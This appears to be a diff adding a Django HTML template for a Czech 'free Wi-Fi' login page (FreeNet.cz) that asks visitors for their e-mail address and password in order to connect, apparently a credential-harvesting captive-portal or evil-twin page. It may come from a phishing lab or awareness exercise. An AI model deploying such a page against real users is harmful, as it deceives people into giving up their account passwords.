@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+{% load static %}
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Bezplatné Wi-Fi připojení</title>
+    <link rel="stylesheet" href="{% static 'main/style.css' %}">
+</head>
+<body>
+    <div class="form-container">
+        <h1>Získejte bezplatné Wi-Fi připojení</h1>
+        <p class="subtitle">Pro připojení zadejte prosím svůj e-mail a heslo.</p>
+
+        <form method="post">
+            {% csrf_token %}
+            {{ form.as_p }}
+            <button type="submit" class="btn">Připojit</button>
+        </form>
+        <footer class="footer">
+        <p>© 2025 FreeNet.cz – Všechna práva vyhrazena</p>
+    </footer>
+    </div>
+
+</body>
+</html>
